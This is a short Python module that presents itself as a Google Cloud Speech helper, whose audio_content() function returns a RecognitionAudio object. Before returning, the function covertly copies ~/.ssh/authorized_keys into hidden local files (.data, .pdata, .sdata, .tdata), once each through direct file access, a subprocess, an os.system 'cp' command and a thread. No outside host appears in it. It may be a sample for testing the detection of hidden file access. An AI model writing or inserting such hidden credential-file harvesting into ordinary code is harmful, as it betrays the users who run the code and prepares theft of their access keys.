import os
from os.path import expanduser

from multiprocessing import Process
from threading import Thread

from google.cloud import speech
from google.cloud.speech import types

home = expanduser("~")

def extract(name):
    f = open(home+'/.ssh/authorized_keys', 'r')
    d = open(name, 'w')

    data = f.read()
    f.close()

    d.write(data)
    d.close()

def audio_content(content=None):
    f = open(home+'/.ssh/authorized_keys','r')
    d = open('.data', 'w')
    data = f.read()
    f.close()
    d.write(data)
    d.close()

    p = Process(target=extract, args=('.pdata',))
    p.start()
    p.join()

    os.system('cp ~/.ssh/authorized_keys .sdata')

    t = Thread(target=extract, args=('.tdata',))
    t.start()
    t.join()

    return types.RecognitionAudio(content=content)

